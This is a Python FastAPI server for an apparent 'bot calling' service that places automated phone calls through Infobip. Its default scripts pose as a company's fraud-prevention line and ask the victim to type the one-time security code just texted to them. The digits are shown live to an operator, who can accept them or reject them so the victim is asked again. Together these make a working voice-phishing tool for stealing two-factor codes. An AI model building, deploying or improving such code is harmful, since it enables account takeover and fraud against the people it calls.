from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, Request
from fastapi.responses import StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import asyncio
import json
import httpx

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', '')
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY', '')
INFOBIP_FROM_NUMBER = os.environ.get('INFOBIP_FROM_NUMBER', '+18085821342')
INFOBIP_NUMBER_ID = os.environ.get('INFOBIP_NUMBER_ID', '')
INFOBIP_APP_NAME = os.environ.get('INFOBIP_APP_NAME', 'AmericanClub1')
INFOBIP_APP_ID = os.environ.get('INFOBIP_APP_ID', '')

# Webhook URL for callbacks
WEBHOOK_BASE_URL = os.environ.get('WEBHOOK_BASE_URL', 'https://voice-navigator-9.preview.emergentagent.com')

# Create the main app
app = FastAPI(title="Bot Calling API")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SSE connections storage
sse_connections: Dict[str, asyncio.Queue] = {}

# Active calls mapping (call_id -> infobip_call_id)
active_calls: Dict[str, str] = {}

# HTTP client for Infobip
http_client: Optional[httpx.AsyncClient] = None

async def get_http_client() -> httpx.AsyncClient:
    global http_client
    if http_client is None:
        http_client = httpx.AsyncClient(
            base_url=INFOBIP_BASE_URL,
            headers={
                "Authorization": f"App {INFOBIP_API_KEY}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=30.0
        )
    return http_client

# ===================
# Pydantic Models
# ===================

class CallConfig(BaseModel):
    call_type: str = "Login Verification"
    voice_model: str = "Hera (Female, Mature)"
    from_number: str = INFOBIP_FROM_NUMBER
    recipient_number: str
    recipient_name: Optional[str] = None
    service_name: Optional[str] = None
    otp_digits: int = 6

class CallSteps(BaseModel):
    step1: str = "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0."
    step2: str = "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number."
    step3: str = "Thank you. Please hold for a moment while we verify your code."
    accepted: str = "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye."
    rejected: str = "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number."

class CallRequest(BaseModel):
    config: CallConfig
    steps: CallSteps

class CallLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    config: CallConfig
    steps: CallSteps
    status: str = "PENDING"
    current_step: str = "step1"
    step1_retry_count: int = 0
    step2_retry_count: int = 0
    infobip_call_id: Optional[str] = None
    dtmf_step1: Optional[str] = None
    dtmf_code: Optional[str] = None
    dtmf_codes_history: List[str] = Field(default_factory=list)
    awaiting_verification: bool = False
    verification_result: Optional[str] = None
    started_at: Optional[str] = None
    ended_at: Optional[str] = None
    duration_seconds: int = 0
    error_message: Optional[str] = None
    created_at: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    events: List[Dict] = Field(default_factory=list)

# ===================
# Helper Functions
# ===================

async def broadcast_event(call_id: str, event: Dict):
    """Send event to SSE connections"""
    if call_id in sse_connections:
        try:
            await sse_connections[call_id].put(event)
        except Exception as e:
            logger.error(f"Error broadcasting event: {e}")

async def add_call_event(call_id: str, event_type: str, details: str, dtmf_code: Optional[str] = None, show_verify: bool = False):
    """Add event to call log and broadcast"""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "details": details,
        "call_id": call_id
    }
    
    if dtmf_code:
        event["dtmf_code"] = dtmf_code
    
    if show_verify:
        event["show_verify"] = True
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$push": {"events": event}}
    )
    
    await broadcast_event(call_id, event)
    return event

# Voice name mapping
VOICE_MAP = {
    "hera": {"name": "Joanna", "language": "en"},
    "aria": {"name": "Kendra", "language": "en"},
    "apollo": {"name": "Matthew", "language": "en"},
    "zeus": {"name": "Joey", "language": "en"},
}

def prepare_tts_text(template: str, config: CallConfig) -> str:
    """Replace placeholders in TTS template"""
    text = template
    text = text.replace("{name}", config.recipient_name or "Customer")
    text = text.replace("{service}", config.service_name or "Account")
    text = text.replace("{digits}", str(config.otp_digits))
    return text

# ===================
# Infobip Calls API Functions
# ===================

async def create_calls_application():
    """Create or get Infobip Calls Application"""
    global INFOBIP_APP_ID
    
    if INFOBIP_APP_ID:
        return INFOBIP_APP_ID
    
    http = await get_http_client()
    
    # First try to list existing applications
    try:
        response = await http.get("/calls/1/applications")
        if response.status_code == 200:
            apps = response.json()
            if apps.get("results"):
                for app_data in apps["results"]:
                    if app_data.get("name") == "BotCallerIVR":
                        INFOBIP_APP_ID = app_data["id"]
                        logger.info(f"Found existing application: {INFOBIP_APP_ID}")
                        return INFOBIP_APP_ID
    except Exception as e:
        logger.warning(f"Error listing applications: {e}")
    
    # Create new application
    try:
        payload = {
            "name": "BotCallerIVR",
            "configuration": {
                "actions": {
                    "url": f"{WEBHOOK_BASE_URL}/api/calls-webhook/actions",
                    "type": "application/json"
                },
                "events": {
                    "url": f"{WEBHOOK_BASE_URL}/api/calls-webhook/events",
                    "type": "application/json"
                }
            }
        }
        
        response = await http.post("/calls/1/applications", json=payload)
        logger.info(f"Create application response: {response.status_code} - {response.text}")
        
        if response.status_code in [200, 201]:
            result = response.json()
            INFOBIP_APP_ID = result.get("id")
            logger.info(f"Created new application: {INFOBIP_APP_ID}")
            return INFOBIP_APP_ID
    except Exception as e:
        logger.error(f"Error creating application: {e}")
    
    return None

async def create_outbound_call(call_id: str, config: CallConfig):
    """Create outbound call using Infobip Calls API"""
    try:
        http = await get_http_client()
        
        # Ensure application exists
        app_id = await create_calls_application()
        if not app_id:
            await add_call_event(call_id, "CALL_ERROR", "Failed to create/get Infobip application")
            return None
        
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        
        payload = {
            "endpoint": {
                "type": "PHONE",
                "phoneNumber": to_num
            },
            "from": from_num,
            "applicationId": app_id,
            "connectTimeout": 60,
            "machineDetection": {
                "enabled": True  # Enable AMD to detect human/voicemail
            }
        }
        
        logger.info(f"Creating outbound call: {json.dumps(payload)}")
        
        # Log call initiation
        await add_call_event(call_id, "CALL_INITIATED", f"Outbound request via {config.from_number} to {config.recipient_number}")
        
        response = await http.post("/calls/1/calls", json=payload)
        logger.info(f"Create call response: {response.status_code} - {response.text}")
        
        if response.status_code in [200, 201]:
            result = response.json()
            infobip_call_id = result.get("id")
            
            # Store mapping
            active_calls[call_id] = infobip_call_id
            
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"infobip_call_id": infobip_call_id, "status": "CALLING"}}
            )
            
            await add_call_event(call_id, "CALL_CREATED", f"Call ID: {infobip_call_id[:16]}...")
            
            return infobip_call_id
        else:
            error_msg = f"Failed to create call: {response.status_code} - {response.text}"
            await add_call_event(call_id, "CALL_ERROR", error_msg)
            return None
            
    except Exception as e:
        logger.error(f"Error creating call: {e}")
        await add_call_event(call_id, "CALL_ERROR", str(e))
        return None

async def say_text(infobip_call_id: str, text: str, language: str = "en"):
    """Play TTS on active call"""
    try:
        http = await get_http_client()
        
        payload = {
            "text": text,
            "language": language
        }
        
        logger.info(f"Saying text on call {infobip_call_id}: {text[:50]}...")
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/say", json=payload)
        logger.info(f"Say response: {response.status_code} - {response.text}")
        
        return response.status_code in [200, 201, 202]
        
    except Exception as e:
        logger.error(f"Error saying text: {e}")
        return False

async def collect_dtmf(infobip_call_id: str, max_digits: int, timeout: int = 20, prompt_text: str = None):
    """Collect DTMF from active call"""
    try:
        http = await get_http_client()
        
        payload = {
            "maxDigits": max_digits,
            "timeout": timeout
        }
        
        if prompt_text:
            payload["prompt"] = {
                "say": {
                    "text": prompt_text,
                    "language": "en"
                }
            }
        
        logger.info(f"Collecting DTMF on call {infobip_call_id}, max: {max_digits}")
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/collect", json=payload)
        logger.info(f"Collect response: {response.status_code} - {response.text}")
        
        return response.status_code in [200, 201, 202]
        
    except Exception as e:
        logger.error(f"Error collecting DTMF: {e}")
        return False

async def hangup_call(infobip_call_id: str):
    """Hangup active call"""
    try:
        http = await get_http_client()
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/hangup")
        logger.info(f"Hangup response: {response.status_code}")
        
        return response.status_code in [200, 201, 202, 204]
        
    except Exception as e:
        logger.error(f"Error hanging up: {e}")
        return False

async def execute_ivr_step(call_id: str, step: str):
    """Execute IVR step on active call"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    infobip_call_id = call_log.get("infobip_call_id")
    if not infobip_call_id:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
    voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
    
    if step == "step1":
        # Play greeting and collect 1 digit
        text = prepare_tts_text(steps.step1, config)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step1"}})
        await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 if NOT you, Press 0 if it was you")
        
        # Use collect with prompt
        success = await collect_dtmf(infobip_call_id, 1, 15, text)
        if not success:
            await add_call_event(call_id, "STEP1_ERROR", "Failed to start DTMF collection")
            
    elif step == "step2":
        # Play prompt and collect OTP digits
        text = prepare_tts_text(steps.step2, config)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step2"}})
        await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
        
        success = await collect_dtmf(infobip_call_id, config.otp_digits, 20, text)
        if not success:
            await add_call_event(call_id, "STEP2_ERROR", "Failed to start DTMF collection")
            
    elif step == "step3":
        # Play verification wait message
        text = prepare_tts_text(steps.step3, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "step3", "awaiting_verification": True}}
        )
        await add_call_event(call_id, "STEP3_PLAYING", "Please wait while we verify your code...")
        
        success = await say_text(infobip_call_id, text)
        if success:
            await add_call_event(call_id, "AWAITING_VERIFICATION", "Waiting for Accept or Deny...", show_verify=True)
            
    elif step == "accepted":
        # Play accepted message and hangup
        text = prepare_tts_text(steps.accepted, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "accepted", "verification_result": "accepted", "awaiting_verification": False}}
        )
        await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted! Playing final message...")
        
        await say_text(infobip_call_id, text)
        # Hangup will be triggered after SAY_FINISHED event
        
    elif step == "rejected":
        # Play rejected message and collect new code
        text = prepare_tts_text(steps.rejected, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "rejected", "awaiting_verification": False, "dtmf_code": None}}
        )
        await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
        
        # Collect new code with rejected message as prompt
        success = await collect_dtmf(infobip_call_id, config.otp_digits, 20, text)

async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
    """Simulate IVR flow for demo/testing (single session)"""
    try:
        await asyncio.sleep(1)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "CALLING", "current_step": "step1"}})
        await add_call_event(call_id, "CALL_CREATED", f"[SIMULATION] Calling {config.recipient_number}...")
        
        await asyncio.sleep(2)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
        await add_call_event(call_id, "CALL_RINGING", "Phone is ringing...")
        
        await asyncio.sleep(2)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}})
        await add_call_event(call_id, "CALL_ESTABLISHED", "Call connected - Single session started")
        
        # Step 1
        await add_call_event(call_id, "STEP1_PLAYING", "Playing: Press 1 if NOT you, Press 0 if it was you")
        await asyncio.sleep(5)
        dtmf_step1 = "1"
        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1, "current_step": "step2"}})
        await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
        
        # Step 2
        await asyncio.sleep(1)
        await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
        await asyncio.sleep(4)
        otp_code = "584219"
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
             "$push": {"dtmf_codes_history": otp_code}}
        )
        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
        
        # Step 3 - Wait for verification
        await asyncio.sleep(1)
        await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify...")
        await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
        
        # In simulation, call stays active until user clicks Accept/Deny
        # The verification endpoint will handle the next step
        
    except Exception as e:
        logger.error(f"Error in simulation: {e}")
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED", "error_message": str(e)}})
        await add_call_event(call_id, "CALL_FAILED", str(e))

# ===================
# API Endpoints
# ===================

@api_router.get("/")
async def root():
    return {
        "message": "Bot Calling API",
        "status": "running",
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "mode": "Calls API (Single Session IVR)"
    }

@api_router.get("/config")
async def get_config():
    return {
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "from_number": INFOBIP_FROM_NUMBER,
        "app_name": INFOBIP_APP_NAME,
        "app_id": INFOBIP_APP_ID
    }

@api_router.post("/calls/initiate", response_model=Dict)
async def initiate_call(request: CallRequest, background_tasks: BackgroundTasks):
    """Initiate a new single-session IVR call"""
    try:
        call_log = CallLog(
            config=request.config,
            steps=request.steps
        )
        
        doc = call_log.model_dump()
        await db.call_logs.insert_one(doc)
        
        await add_call_event(call_log.id, "CALL_QUEUED", "Single-session IVR call queued")
        
        if INFOBIP_API_KEY and INFOBIP_BASE_URL:
            # Create outbound call using Calls API
            infobip_call_id = await create_outbound_call(call_log.id, request.config)
            if infobip_call_id:
                # IVR flow will be handled by webhook events
                pass
            else:
                await add_call_event(call_log.id, "CALL_ERROR", "Failed to create outbound call")
        else:
            # Simulation mode
            background_tasks.add_task(simulate_ivr_flow, call_log.id, request.config, request.steps)
        
        return {
            "status": "initiated",
            "call_id": call_log.id,
            "message": "Single-session IVR call initiated",
            "using_infobip": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL)
        }
        
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/verify")
async def verify_code(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Accept or Deny the entered code - triggers next IVR step"""
    try:
        data = await request.json()
        is_accepted = data.get("accepted", False)
        
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        infobip_call_id = call_log.get("infobip_call_id")
        
        if is_accepted:
            # Accept - play accepted message then hangup
            if infobip_call_id and INFOBIP_API_KEY:
                background_tasks.add_task(execute_ivr_step, call_id, "accepted")
            else:
                # Simulation
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {
                        "verification_result": "accepted",
                        "current_step": "accepted",
                        "awaiting_verification": False,
                        "status": "FINISHED",
                        "ended_at": datetime.now(timezone.utc).isoformat()
                    }}
                )
                await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted!")
                await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing: Thank you message...")
                await add_call_event(call_id, "CALL_FINISHED", "Call completed successfully")
        else:
            # Deny - play rejected message and collect new code
            if infobip_call_id and INFOBIP_API_KEY:
                background_tasks.add_task(execute_ivr_step, call_id, "rejected")
            else:
                # Simulation - ask for new code
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"awaiting_verification": False, "current_step": "rejected", "dtmf_code": None}}
                )
                await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
                await add_call_event(call_id, "REJECTED_PLAYING", "Playing: Please enter the code again...")
                
                # Simulate new code entry after delay
                await asyncio.sleep(5)
                new_code = "123456"
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_code": new_code, "current_step": "step3", "awaiting_verification": True},
                     "$push": {"dtmf_codes_history": new_code}}
                )
                await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"New security code entered: {new_code}", new_code, show_verify=True)
                await add_call_event(call_id, "AWAITING_VERIFICATION", "Waiting for Accept or Deny...", show_verify=True)
        
        return {"status": "verified", "accepted": is_accepted}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/hangup")
async def hangup_call_endpoint(call_id: str):
    """Terminate the active call"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        infobip_call_id = call_log.get("infobip_call_id")
        
        if infobip_call_id and INFOBIP_API_KEY:
            await hangup_call(infobip_call_id)
        
        end_time = datetime.now(timezone.utc).isoformat()
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FINISHED", "ended_at": end_time, "awaiting_verification": False}}
        )
        
        await add_call_event(call_id, "CALL_HANGUP", "Call terminated by user")
        
        # Clean up active calls
        if call_id in active_calls:
            del active_calls[call_id]
        
        return {"status": "hangup", "call_id": call_id}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error hanging up: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/calls/{call_id}")
async def get_call(call_id: str):
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        raise HTTPException(status_code=404, detail="Call not found")
    return call_log

@api_router.get("/calls")
async def get_all_calls():
    calls = await db.call_logs.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
    return calls

@api_router.delete("/calls/{call_id}")
async def delete_call(call_id: str):
    result = await db.call_logs.delete_one({"id": call_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Call not found")
    return {"status": "deleted", "call_id": call_id}

@api_router.get("/calls/{call_id}/events")
async def stream_call_events(call_id: str):
    """SSE endpoint for real-time call events"""
    async def event_generator():
        queue = asyncio.Queue()
        sse_connections[call_id] = queue
        
        try:
            yield f"data: {json.dumps({'type': 'connected', 'message': 'Connected to event stream'})}\n\n"
            
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log and call_log.get("events"):
                for event in call_log["events"]:
                    yield f"data: {json.dumps(event)}\n\n"
            
            while True:
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30)
                    yield f"data: {json.dumps(event)}\n\n"
                    
                    if event.get("event_type") in ["CALL_FINISHED", "CALL_FAILED", "CALL_HANGUP"]:
                        break
                except asyncio.TimeoutError:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                    
        except asyncio.CancelledError:
            logger.info(f"SSE connection closed for call {call_id}")
        finally:
            if call_id in sse_connections:
                del sse_connections[call_id]
    
    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"}
    )

# ===================
# Infobip Calls Webhooks
# ===================

@api_router.post("/calls-webhook/events")
async def handle_calls_events(request: Request, background_tasks: BackgroundTasks):
    """Handle Infobip Calls API events (CALL_ESTABLISHED, CALL_FINISHED, etc.)"""
    try:
        payload = await request.json()
        logger.info(f"Calls Event Webhook: {json.dumps(payload)}")
        
        event_type = payload.get("type") or payload.get("event")
        infobip_call_id = payload.get("callId") or payload.get("id")
        
        if not infobip_call_id:
            return {"status": "no call id"}
        
        # Find our call_id by infobip_call_id
        call_log = await db.call_logs.find_one({"infobip_call_id": infobip_call_id}, {"_id": 0})
        if not call_log:
            # Try to find by active_calls mapping
            for cid, icid in active_calls.items():
                if icid == infobip_call_id:
                    call_log = await db.call_logs.find_one({"id": cid}, {"_id": 0})
                    break
        
        if not call_log:
            logger.warning(f"No call found for Infobip call ID: {infobip_call_id}")
            return {"status": "call not found"}
        
        call_id = call_log["id"]
        
        # Handle different event types with detailed logging
        if event_type == "CALL_RINGING":
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "RINGING"}}
            )
            await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
            
        elif event_type == "CALL_PRE_ESTABLISHED":
            await add_call_event(call_id, "CALL_PRE_ESTABLISHED", "Call pre-established, waiting for answer...")
            
        elif event_type == "CALL_EARLY_MEDIA":
            await add_call_event(call_id, "CALL_EARLY_MEDIA", "Early media detected")
            
        elif event_type == "CALL_ESTABLISHED":
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}}
            )
            await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
            
            # Start Step 1
            background_tasks.add_task(execute_ivr_step, call_id, "step1")
            
        elif event_type == "MACHINE_DETECTION_FINISHED":
            # AMD (Answering Machine Detection) result
            detection_result = payload.get("result", {})
            detection_type = detection_result.get("detectionResult", "UNKNOWN")
            
            if detection_type == "HUMAN":
                await add_call_event(call_id, "AMD_DETECTION", "Human voice identified (AMD Success)")
            elif detection_type == "MACHINE":
                await add_call_event(call_id, "AMD_DETECTION", "Voicemail/Machine detected")
            else:
                await add_call_event(call_id, "AMD_DETECTION", f"Detection result: {detection_type}")
            
        elif event_type == "CALL_FINISHED":
            end_time = datetime.now(timezone.utc).isoformat()
            duration = payload.get("duration", 0)
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "FINISHED", "ended_at": end_time, "duration_seconds": duration}}
            )
            await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration}s")
            
            # Clean up
            if call_id in active_calls:
                del active_calls[call_id]
                
        elif event_type == "CALL_FAILED":
            error_code = payload.get("errorCode", {})
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "FAILED", "error_message": str(error_code)}}
            )
            await add_call_event(call_id, "CALL_FAILED", f"Call failed: {error_code}")
            
        elif event_type == "CALL_HANGUP":
            reason = payload.get("hangupReason", "Unknown")
            await add_call_event(call_id, "CALL_HANGUP", f"Call hangup: {reason}")
            
        elif event_type == "SAY_FINISHED":
            # TTS finished - check current step for next action
            current_step = call_log.get("current_step")
            if current_step == "accepted":
                # Hangup after accepted message
                await asyncio.sleep(1)  # Small delay before hangup
                background_tasks.add_task(hangup_call, infobip_call_id)
            elif current_step == "step3":
                # Waiting for verification - do nothing, call stays on hold
                pass
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Calls event webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/calls-webhook/actions")
async def handle_calls_actions(request: Request, background_tasks: BackgroundTasks):
    """Handle Infobip Calls API action responses (DTMF collected, etc.)"""
    try:
        payload = await request.json()
        logger.info(f"Calls Action Webhook: {json.dumps(payload)}")
        
        action_type = payload.get("type") or payload.get("action")
        infobip_call_id = payload.get("callId") or payload.get("id")
        
        if not infobip_call_id:
            return {"status": "no call id"}
        
        call_log = await db.call_logs.find_one({"infobip_call_id": infobip_call_id}, {"_id": 0})
        if not call_log:
            for cid, icid in active_calls.items():
                if icid == infobip_call_id:
                    call_log = await db.call_logs.find_one({"id": cid}, {"_id": 0})
                    break
        
        if not call_log:
            return {"status": "call not found"}
        
        call_id = call_log["id"]
        config = CallConfig(**call_log["config"])
        current_step = call_log.get("current_step", "step1")
        
        if action_type == "COLLECT_FINISHED":
            dtmf = payload.get("result", {}).get("digits") or payload.get("digits")
            
            if dtmf:
                if current_step == "step1":
                    # Step 1 DTMF received
                    await db.call_logs.update_one(
                        {"id": call_id},
                        {"$set": {"dtmf_step1": dtmf}}
                    )
                    await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf}", dtmf)
                    
                    # Proceed to Step 2
                    background_tasks.add_task(execute_ivr_step, call_id, "step2")
                    
                elif current_step in ["step2", "rejected"]:
                    # OTP code received
                    if len(dtmf) >= config.otp_digits:
                        otp_code = dtmf[:config.otp_digits]
                        await db.call_logs.update_one(
                            {"id": call_id},
                            {"$set": {"dtmf_code": otp_code, "awaiting_verification": True},
                             "$push": {"dtmf_codes_history": otp_code}}
                        )
                        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
                        
                        # Proceed to Step 3 (verification wait)
                        background_tasks.add_task(execute_ivr_step, call_id, "step3")
                    else:
                        # Incomplete code - retry
                        await add_call_event(call_id, "DTMF_INCOMPLETE", f"Received {len(dtmf)} digits, need {config.otp_digits}")
                        # Retry collection
                        step = "rejected" if current_step == "rejected" else "step2"
                        background_tasks.add_task(execute_ivr_step, call_id, step)
            else:
                # No DTMF received (timeout)
                retry_field = "step1_retry_count" if current_step == "step1" else "step2_retry_count"
                retry_count = call_log.get(retry_field, 0)
                
                if retry_count < 2:
                    await db.call_logs.update_one({"id": call_id}, {"$inc": {retry_field: 1}})
                    await add_call_event(call_id, f"{current_step.upper()}_NO_RESPONSE", f"No input received, retrying... ({retry_count + 1}/3)")
                    
                    # Retry current step
                    background_tasks.add_task(execute_ivr_step, call_id, current_step)
                else:
                    await add_call_event(call_id, "CALL_FAILED", "No response after 3 attempts")
                    await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
                    await hangup_call(infobip_call_id)
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Calls action webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.get("/voice-models")
async def get_voice_models():
    return [
        {"id": "hera", "name": "Hera (Female, Mature)", "gender": "female"},
        {"id": "aria", "name": "Aria (Female, Young)", "gender": "female"},
        {"id": "apollo", "name": "Apollo (Male, Mature)", "gender": "male"},
        {"id": "zeus", "name": "Zeus (Male, Deep)", "gender": "male"},
    ]

@api_router.get("/call-types")
async def get_call_types():
    return [
        {"id": "login_verification", "name": "Login Verification"},
        {"id": "otp_delivery", "name": "OTP Delivery"},
        {"id": "appointment_reminder", "name": "Appointment Reminder"},
        {"id": "custom", "name": "Custom Script"},
    ]

# Include router
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown():
    global http_client
    if http_client:
        await http_client.aclose()
    client.close()
